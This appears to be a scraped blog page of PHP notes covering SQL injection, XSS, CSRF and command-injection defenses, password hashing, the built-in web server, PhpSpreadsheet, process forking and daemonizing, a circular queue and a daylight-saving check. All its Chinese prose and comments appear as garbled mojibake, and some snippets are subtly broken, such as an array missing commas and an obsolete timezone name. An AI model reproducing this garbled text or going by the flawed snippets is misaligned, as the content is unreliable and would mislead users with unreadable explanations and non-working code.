class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">SQL æ³¨å…¥</span><br><span class="line">$username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">$query = $pdo-&gt;prepare(<span class="string">'SELECT * FROM users WHERE username = :username'</span>);</span><br><span class="line">$query-&gt;execute([<span class="string">'username'</span> =&gt; $username]);</span><br><span class="line">$data = $query-&gt;fetch();</span><br><span class="line"></span><br><span class="line">xss </span><br><span class="line">$searchQuery = htmlentities($searchQuery, ENT_QUOTES);</span><br><span class="line">XSRF/CSRF</span><br><span class="line">æœ€å¸¸ç”¨çš„é˜²å¾¡æ–¹æ³•æ˜¯ç”Ÿæˆä¸€ä¸ª CSRF ä»¤ç‰ŒåŠ å¯†å®‰å…¨å­—ç¬¦ä¸²ï¼Œä¸€èˆ¬ç§°å…¶ä¸º Tokenï¼Œå¹¶å°† Token å­˜å‚¨äº Cookie æˆ–è€… Session ä¸­ã€‚</span><br><span class="line"></span><br><span class="line">æ¯æ¬¡ä½ åœ¨ç½‘é¡µæ„é€ è¡¨å•æ—¶ï¼Œå°† Token ä»¤ç‰Œæ”¾åœ¨è¡¨å•ä¸­çš„éšè—å­—æ®µï¼Œè¡¨å•è¯·æ±‚æœåŠ¡å™¨ä»¥åä¼šæ ¹æ®ç”¨æˆ·çš„ Cookie æˆ–è€… Session é‡Œçš„ Token ä»¤ç‰Œæ¯”å¯¹ï¼Œæ ¡éªŒæˆåŠŸæ‰ç»™äºˆé€šè¿‡</span><br><span class="line"></span><br><span class="line">å¯†ç å“ˆå¸Œ</span><br><span class="line"></span><br><span class="line"><span class="comment">//user signup</span></span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">$hashedPassword = password_hash($password, PASSWORD_DEFAULT);</span><br><span class="line"></span><br><span class="line"><span class="comment">//login</span></span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">$hash = <span class="string">'1234'</span>; <span class="comment">//load this value from your db</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(password_verify($password, $hash)) &#123;</span><br><span class="line">  echo <span class="string">'Password is valid!'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  echo <span class="string">'Invalid password.'</span>;</span><br><span class="line">&#125;</span><br><span class="line">å¯†ç å“ˆå¸Œå¹¶ä¸æ˜¯å¯†ç åŠ å¯†ã€‚å“ˆå¸Œï¼ˆHashï¼‰æ˜¯å°†ç›®æ ‡æ–‡æœ¬è½¬æ¢æˆå…·æœ‰ç›¸åŒé•¿åº¦çš„ã€ä¸å¯é€†çš„æ‚å‡‘å­—ç¬¦ä¸²ï¼ˆæˆ–å«åšæ¶ˆæ¯æ‘˜è¦ï¼‰ï¼Œè€ŒåŠ å¯†ï¼ˆEncryptï¼‰æ˜¯å°†ç›®æ ‡æ–‡æœ¬è½¬æ¢æˆå…·æœ‰ä¸åŒé•¿åº¦çš„ã€å¯é€†çš„å¯†æ–‡ã€‚æ˜¾ç„¶ä»–ä»¬ä¹‹é—´æœ€å¤§çš„åŒºåˆ«æ˜¯å¯é€†æ€§ï¼Œåœ¨å‚¨å­˜å¯†ç æ—¶ï¼Œæˆ‘ä»¬è¦çš„å°±æ˜¯å“ˆå¸Œè¿™ç§ä¸å¯é€†çš„å±æ€§ã€‚</span><br><span class="line"></span><br><span class="line">å‘½ä»¤æ³¨å…¥</span><br><span class="line">$targetIp = escapeshellarg($_GET[<span class="string">'ip'</span>]);</span><br><span class="line">$output = shell_exec(<span class="string">"ping -c 5 $targetIp"</span>);</span><br><span class="line"></span><br><span class="line">åƒç™»å½•è¿™æ ·çš„æ•æ„Ÿè¡¨å•åº”è¯¥æœ‰ä¸€ä¸ªä¸¥æ ¼çš„é€Ÿç‡é™åˆ¶ï¼Œä»¥é˜²æ­¢æš´åŠ›æ”»å‡»ã€‚ä¿å­˜æ¯ä¸ªç”¨æˆ·åœ¨è¿‡å»å‡ åˆ†é’Ÿå†…å¤±è´¥çš„ç™»å½•å°è¯•æ¬¡æ•°ï¼Œå¦‚æœè¯¥é€Ÿç‡è¶…è¿‡ä½ å®šä¹‰çš„é˜ˆå€¼ï¼Œåˆ™æ‹’ç»è¿›ä¸€æ­¥ç™»å½•å°è¯•ï¼Œç›´åˆ°å†·å´æœŸç»“æŸã€‚è¿˜å¯é€šè¿‡ç”µå­é‚®ä»¶é€šçŸ¥ç”¨æˆ·ç™»å½•å¤±è´¥ï¼Œä»¥ä¾¿ä»–ä»¬çŸ¥é“è‡ªå·±çš„è´¦æˆ·è¢«æˆä¸ºç›®æ ‡ã€‚</span><br><span class="line">https:<span class="comment">//learnku.com/php/t/24930#reply94655</span></span><br></pre></td></tr></table></figure>
<h3 id="å†…ç½®-Web-æœåŠ¡å™¨"><a href="#å†…ç½®-Web-æœåŠ¡å™¨" class="headerlink" title="å†…ç½® Web æœåŠ¡å™¨"></a>å†…ç½® Web æœåŠ¡å™¨</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">php -S localhost:<span class="number">8000</span> -t public/</span><br><span class="line">php -S localhost:<span class="number">8000</span> router.php</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å¯¹URLè¿›è¡Œè§£æï¼Œå¹¶è·å–è¯·æ±‚çš„æ–‡ä»¶å</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$uri = urldecode(parse_url($_SERVER[<span class="string">"REQUEST_URI"</span>], PHP_URL_PATH));</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åˆ¤æ–­æ˜¯å¦å­˜åœ¨è¯¥æ–‡ä»¶ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œåˆ™ç›´æ¥ç»§ç»­åŠ è½½å…¥å£æ–‡ä»¶</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> ($uri !== <span class="string">"/"</span> &amp;&amp; file_exists(__DIR__ . <span class="string">"$uri"</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åŠ è½½å…¥å£æ–‡ä»¶</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">require_once <span class="string">"./index.php"</span>;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/28768#reply94663</span></span><br></pre></td></tr></table></figure>
<h3 id="phpexcel"><a href="#phpexcel" class="headerlink" title="phpexcel"></a>phpexcel</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/PHPOffice/PhpSpreadsheet</span></span><br><span class="line"></span><br><span class="line">composer <span class="built_in">require</span> phpoffice/phpspreadsheet</span><br><span class="line"><span class="built_in">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line">use PhpOffice\PhpSpreadsheet\Spreadsheet;</span><br><span class="line">use PhpOffice\PhpSpreadsheet\Writer\Xlsx;</span><br><span class="line"></span><br><span class="line">$spreadsheet = <span class="keyword">new</span> Spreadsheet();</span><br><span class="line">$sheet = $spreadsheet-&gt;getActiveSheet();</span><br><span class="line">$sheet-&gt;setCellValue(<span class="string">'A1'</span>, <span class="string">'Hello World !'</span>);</span><br><span class="line"></span><br><span class="line">$writer = <span class="keyword">new</span> Xlsx($spreadsheet);</span><br><span class="line">$writer-&gt;save(<span class="string">'hello world.xlsx'</span>);</span><br><span class="line">php -S localhost:<span class="number">8000</span> -t vendor/phpoffice/phpspreadsheet/samples</span><br><span class="line"><span class="comment">// æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">$inputFileName = <span class="string">'./sampleData/example1.xls'</span>;</span><br><span class="line"></span><br><span class="line">$spreadsheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($inputFileName);</span><br><span class="line">$reader = <span class="keyword">new</span> \PhpOffice\PhpSpreadsheet\Reader\Xls();</span><br><span class="line">åªè¦è¯»å–æ•°æ®ï¼Œä¸è¦æ ¼å¼æ—¶ï¼Œå®ä¾‹è¯»å–å™¨ä¸­ readDataOnly å±æ€§ï¼Œå¦‚ä¸‹</span><br><span class="line"></span><br><span class="line">$inputFileType = <span class="string">'Xls'</span>;</span><br><span class="line">$inputFileName = <span class="string">'./sampleData/example1.xls'</span>;</span><br><span class="line"></span><br><span class="line">$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader($inputFileType);</span><br><span class="line"><span class="comment">/**  åªè¦æ•°æ®  **/</span></span><br><span class="line">$reader-&gt;setReadDataOnly(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">$spreadsheet = $reader-&gt;load($inputFileName);</span><br><span class="line"></span><br><span class="line">å¤šä¸ªæ–‡ä»¶åˆå¹¶ä¸ºä¸€ä¸ªå¯¹è±¡</span><br><span class="line"></span><br><span class="line">$inputFileType = <span class="string">'Csv'</span>;</span><br><span class="line">$inputFileNames = [</span><br><span class="line">    <span class="string">'./sampleData/example1.csv'</span>,</span><br><span class="line">    <span class="string">'./sampleData/example2.csv'</span></span><br><span class="line">    <span class="string">'./sampleData/example3.csv'</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader($inputFileType);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** æ‹¿åˆ°ç¬¬ä¸€ä¸ª  **/</span></span><br><span class="line">$inputFileName = array_shift($inputFileNames);</span><br><span class="line"></span><br><span class="line">$spreadsheet = $reader-&gt;load($inputFileName);</span><br><span class="line"></span><br><span class="line">$spreadsheet-&gt;getActiveSheet()</span><br><span class="line">    -&gt;setTitle(pathinfo($inputFileName,PATHINFO_BASENAME));</span><br><span class="line"></span><br><span class="line"><span class="comment">/**  å¾ªç¯è¯»å–  **/</span></span><br><span class="line">foreach($inputFileNames <span class="keyword">as</span> $sheet =&gt; $inputFileName) &#123;</span><br><span class="line">    <span class="comment">/**  é‡æ–°è®¾ç½®å·¥ä½œè¡¨ç´¢å¼•  **/</span></span><br><span class="line">    $reader-&gt;setSheetIndex($sheet+<span class="number">1</span>);</span><br><span class="line">    <span class="comment">/**  æŠŠæ–‡ä»¶å½“åšä¸€ä¸ªæ–°çš„å·¥ä½œè¡¨è½½å…¥  **/</span></span><br><span class="line">    $reader-&gt;loadIntoExisting($inputFileName,$spreadsheet);</span><br><span class="line">    <span class="comment">/**  è®¾ç½®å·¥ä½œè¡¨æ ‡é¢˜  **/</span></span><br><span class="line">    $spreadsheet-&gt;getActiveSheet()</span><br><span class="line">        -&gt;setTitle(pathinfo($inputFileName,PATHINFO_BASENAME));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$spreadsheet = PhpOffice\PhpSpreadsheet\IOFactory::load(<span class="string">"new.xls"</span>);</span><br><span class="line"></span><br><span class="line">$data = $spreadsheet</span><br><span class="line">            -&gt;getSheet(<span class="number">0</span>) <span class="comment">// æŒ‡å®šç¬¬ä¸€ä¸ªå·¥ä½œè¡¨ä¸ºå½“å‰</span></span><br><span class="line">            -&gt;toArray();  <span class="comment">// è½¬ä¸ºæ•°ç»„</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æˆ–è€…å¾—åˆ°å…¨éƒ¨å·¥ä½œè¡¨çš„æ•°æ®æ•°ç»„           </span></span><br><span class="line">$cells=array();</span><br><span class="line"><span class="comment">// å·¥ä½œè¡¨å¯¹è±¡æœ‰è¿­ä»£å™¨å®ç°</span></span><br><span class="line">foreach ( $spreadsheet-&gt;getWorksheetIterator() <span class="keyword">as</span> $data ) &#123;</span><br><span class="line">    $cells = $data-&gt;toArray();</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/30048</span></span><br></pre></td></tr></table></figure>
<h3 id="PHP-å¤šè¿›ç¨‹"><a href="#PHP-å¤šè¿›ç¨‹" class="headerlink" title="PHP å¤šè¿›ç¨‹"></a>PHP å¤šè¿›ç¨‹</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">$processNum = <span class="number">4</span>;</span><br><span class="line">$timeStart = time();</span><br><span class="line">$tasks = range(<span class="number">1</span>, <span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">$jobs = [];</span><br><span class="line">foreach ($tasks <span class="keyword">as</span> $task) &#123;</span><br><span class="line">    <span class="comment">//è¿™é‡Œè®²è¿”å›çš„ç»“æœå¯¹4è¿›è¡Œå–æ¨¡ï¼Œå­˜å…¥4ä¸ªæ•°ç»„ï¼Œç„¶å4ä¸ªè¿›ç¨‹åˆ†åˆ«è¯»å–ä¸åŒçš„æ•°æ®è¿›è¡Œå¤„ç†</span></span><br><span class="line">    $jobs[$task % $processNum][] = $task;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mainPid = posix_getpid();</span><br><span class="line">echo <span class="string">"ä¸»è¿›ç¨‹ï¼š"</span> . $mainPid . PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $processNum; $i++) &#123;</span><br><span class="line">    $pid = pcntl_fork();</span><br><span class="line">    <span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="comment">//é”™è¯¯å¤„ç†ï¼šåˆ›å»ºå­è¿›ç¨‹å¤±è´¥æ—¶è¿”å›-1.</span></span><br><span class="line">        die(<span class="string">'could not fork'</span>);</span><br><span class="line">    &#125; elseif ($pid) &#123;</span><br><span class="line">        <span class="comment">//çˆ¶è¿›ç¨‹ä¼šå¾—åˆ°å­è¿›ç¨‹å·ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯çˆ¶è¿›ç¨‹æ‰§è¡Œçš„é€»è¾‘</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// å­è¿›ç¨‹å¾—åˆ°çš„$pidä¸º0, æ‰€ä»¥è¿™é‡Œæ˜¯å­è¿›ç¨‹æ‰§è¡Œçš„é€»è¾‘ã€‚</span></span><br><span class="line">        $content = $jobs[$i];</span><br><span class="line">        $childStart = time();</span><br><span class="line">        foreach ($content <span class="keyword">as</span> $v2) &#123;</span><br><span class="line">            sleep(<span class="number">1</span>); <span class="comment">// å­è¿›ç¨‹æ‰§è¡Œçš„é€»è¾‘</span></span><br><span class="line">        &#125;</span><br><span class="line">        $childEnd = time();</span><br><span class="line">        $childDiff = $childEnd - $childStart;</span><br><span class="line">        echo <span class="string">"#"</span> . posix_getpid() . <span class="string">"æ‰§è¡Œå®Œæ¯•ï¼Œç”¨æ—¶ï¼š"</span> . $childDiff . <span class="string">"ç§’"</span> . PHP_EOL;</span><br><span class="line">        exit(); <span class="comment">// å­è¿›ç¨‹æ‰§è¡Œå®Œåå¿…é¡»é€€å‡ºï¼Œå¦åˆ™ä¼šå¾ªç¯çš„åˆ›å»ºè¿›ç¨‹...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿™é‡ŒæŒ‚èµ·ä¸»è¿›ç¨‹ï¼Œç­‰å¾…å­è¿›ç¨‹å…¨éƒ¨é€€å‡ºåå†é€€å‡ºä¸»è¿›ç¨‹</span></span><br><span class="line"><span class="keyword">while</span> ($processNum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( pcntl_wait($status) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        $processNum--;</span><br><span class="line">        echo <span class="string">"#"</span> . $pid . <span class="string">"é€€å‡º"</span> . PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$timeEnd = time();</span><br><span class="line">$diff = $timeEnd - $timeStart;</span><br><span class="line">echo <span class="string">'å…±è®¡ç”¨æ—¶ï¼š'</span> . $diff . <span class="string">'ç§’'</span>;https:<span class="comment">//learnku.com/laravel/t/30134</span></span><br></pre></td></tr></table></figure>
<h3 id="php-è¿›ç¨‹"><a href="#php-è¿›ç¨‹" class="headerlink" title="php è¿›ç¨‹"></a>php è¿›ç¨‹</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">åå°è¿è¡Œ</span><br><span class="line"><span class="keyword">if</span> ($pid=pcntl_fork ()) exit (<span class="number">0</span>);<span class="comment">// æ˜¯çˆ¶è¿›ç¨‹ï¼Œç»“æŸçˆ¶è¿›ç¨‹ï¼Œå­è¿›ç¨‹ç»§ç»­</span></span><br><span class="line">è„±ç¦»æ§åˆ¶ç»ˆç«¯ï¼Œç™»å½•ä¼šè¯å’Œè¿›ç¨‹ç»„</span><br><span class="line">posix_setsid ();<span class="comment">// å­è¿›ç¨‹å‡çº§ç»„é•¿è¿›ç¨‹ï¼Œè„±ç¦»åŸæ¥çš„ä¼šè¯ / ç»ˆç«¯</span></span><br><span class="line">ç¦æ­¢è¿›ç¨‹é‡æ–°æ‰“å¼€æ§åˆ¶ç»ˆç«¯</span><br><span class="line"><span class="keyword">if</span> ($pid=pcntl_fork ()) exit (<span class="number">0</span>);<span class="comment">// ç»“æŸç¬¬ä¸€å­è¿›ç¨‹ï¼Œç¬¬äºŒå­è¿›ç¨‹ç»§ç»­ï¼ˆç¬¬äºŒå­è¿›ç¨‹ä¸å†æ˜¯ä¼šè¯ç»„é•¿ï¼‰</span></span><br><span class="line">å…³é—­æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦</span><br><span class="line">fclose (STDIN),fclose (STDOUT),fclose (STDERR)<span class="comment">// å…³é—­æ ‡å‡†è¾“å…¥è¾“å‡ºä¸é”™è¯¯æ˜¾ç¤ºã€‚</span></span><br><span class="line">æ”¹å˜å½“å‰å·¥ä½œç›®å½•</span><br><span class="line">chdir(<span class="string">"/"</span>)</span><br><span class="line">é‡è®¾æ–‡ä»¶åˆ›å»ºæ©æ¨¡</span><br><span class="line">umask (<span class="number">0</span>);<span class="comment">// é˜²æ­¢ç»§æ‰¿çˆ¶çº§é—ç•™ä¸‹æ¥çš„æ©æ¨¡</span></span><br></pre></td></tr></table></figure>
<h3 id="ç æ¨¡æ‹Ÿå®ç°é˜Ÿåˆ—"><a href="#ç æ¨¡æ‹Ÿå®ç°é˜Ÿåˆ—" class="headerlink" title="ç æ¨¡æ‹Ÿå®ç°é˜Ÿåˆ—"></a>ç æ¨¡æ‹Ÿå®ç°é˜Ÿåˆ—</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'MAXSIZE'</span>,<span class="number">5</span>);<span class="comment">//é˜Ÿåˆ—ç©ºé—´å¤§å°</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param $queue é˜Ÿåˆ—å­˜å‚¨ç©ºé—´</span></span><br><span class="line"><span class="comment"> * @param $front é˜Ÿåˆ—é˜Ÿå¤´æ¸¸æ ‡</span></span><br><span class="line"><span class="comment"> * @param $near  é˜Ÿåˆ—é˜Ÿå°¾æ¸¸æ ‡</span></span><br><span class="line"><span class="comment"> * @param $data  è¿›é˜Ÿçš„æ•°æ®</span></span><br><span class="line"><span class="comment"> * @return int</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enQueue</span>(<span class="params">&amp;$queue,$front,$near,$data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (($near+<span class="number">1</span>)%MAXSIZE==$front)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"é˜Ÿç©ºé—´å·²æ»¡"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $queue[$near%MAXSIZE] = $data;</span><br><span class="line">    $near+=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> $near;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å‡ºé˜Ÿæ“ä½œ</span></span><br><span class="line"><span class="comment"> * @param $queue</span></span><br><span class="line"><span class="comment"> * @param $front</span></span><br><span class="line"><span class="comment"> * @param $near</span></span><br><span class="line"><span class="comment"> * @return int</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deQueue</span>(<span class="params">&amp;$queue,$front,$near</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($front==$near%MAXSIZE)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"ç©ºé˜Ÿåˆ—"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $data = $queue[$front];</span><br><span class="line">    echo <span class="string">"å‡ºé˜Ÿå…ƒç´ ï¼š"</span>.$data.PHP_EOL;</span><br><span class="line">    $front = ($front+<span class="number">1</span>)%MAXSIZE;</span><br><span class="line">    <span class="keyword">return</span> $front;</span><br><span class="line">&#125;</span><br><span class="line">$a = [];<span class="comment">//é˜Ÿåˆ— ä½¿ç”¨æ•°ç»„æ¨¡æ‹Ÿ</span></span><br><span class="line">$front = $near = <span class="number">0</span>;<span class="comment">//æ¸¸æ ‡åˆå§‹åŒ–</span></span><br><span class="line">$near = enQueue($a,$front,$near,<span class="number">1</span>);</span><br><span class="line">$near = enQueue($a,$front,$near,<span class="number">2</span>);</span><br><span class="line">$near = enQueue($a,$front,$near,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">$front = deQueue($a,$front,$near);</span><br><span class="line">$front = deQueue($a,$front,$near);</span><br><span class="line">$front = deQueue($a,$front,$near);</span><br><span class="line"><span class="comment">//$front = deQueue($a,$front,$near);</span></span><br><span class="line"></span><br><span class="line">$near = enQueue($a,$front,$near,<span class="number">100</span>);</span><br><span class="line">$front = deQueue($a,$front,$near);</span><br><span class="line"></span><br><span class="line">$near = enQueue($a,$front,$near,<span class="number">1</span>);</span><br><span class="line">$near = enQueue($a,$front,$near,<span class="number">2</span>);</span><br><span class="line">$near = enQueue($a,$front,$near,<span class="number">3</span>);</span><br><span class="line">$near = enQueue($a,$front,$near,<span class="number">4</span>);</span><br><span class="line">$front = deQueue($a,$front,$near);</span><br><span class="line">$front = deQueue($a,$front,$near);</span><br><span class="line">$front = deQueue($a,$front,$near);</span><br><span class="line">$front = deQueue($a,$front,$near);</span><br><span class="line">é˜Ÿåˆ—å®ç°äº†å…ˆè¿›å…ˆå‡º FIFO çš„åŠŸèƒ½ï¼Œåœ¨è®¸å¤šåº”ç”¨ä¸­å¦‚é˜Ÿåˆ—ç³»ç»Ÿï¼Œæ’é˜Ÿä¹°ç¥¨ç­‰éƒ½åº”ç”¨åˆ°äº†ï¼Œæ¯”å¦‚æˆ‘ä»¬ç”¨çš„ redis ç¼“å­˜ç³»ç»Ÿä¸­çš„åˆ—æ•°æ®ç±»å‹ Listï¼Œå®ƒä¾¿èƒ½å®Œæˆé˜Ÿåˆ—çš„åŠŸèƒ½</span><br><span class="line">https:<span class="comment">//learnku.com/articles/30430</span></span><br></pre></td></tr></table></figure>
<h3 id="å¤ä»¤æ—¶"><a href="#å¤ä»¤æ—¶" class="headerlink" title="å¤ä»¤æ—¶"></a>å¤ä»¤æ—¶</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åˆ¤æ–­ç¾å›½é‚£ä¸ªæ—¶é—´æ®µæ˜¯å¦ä¸ºå¤ä»¤æ—¶</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_dst</span>(<span class="params">$timestamp</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $timezone = date(<span class="string">'e'</span>); <span class="comment">//è·å–å½“å‰ä½¿ç”¨çš„æ—¶åŒº</span></span><br><span class="line">    date_default_timezone_set(<span class="string">'US/Pacific-New'</span>); <span class="comment">//å¼ºåˆ¶è®¾ç½®æ—¶åŒº</span></span><br><span class="line">    $dst = date(<span class="string">'I'</span>,$timestamp); <span class="comment">//åˆ¤æ–­æ˜¯å¦å¤ä»¤æ—¶</span></span><br><span class="line">    date_default_timezone_set($timezone); <span class="comment">//è¿˜åŸæ—¶åŒº</span></span><br><span class="line">    <span class="keyword">return</span> $dst; <span class="comment">//è¿”å›ç»“æœ</span></span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//gist.github.com/flowerains/6694812</span></span><br><span class="line"><span 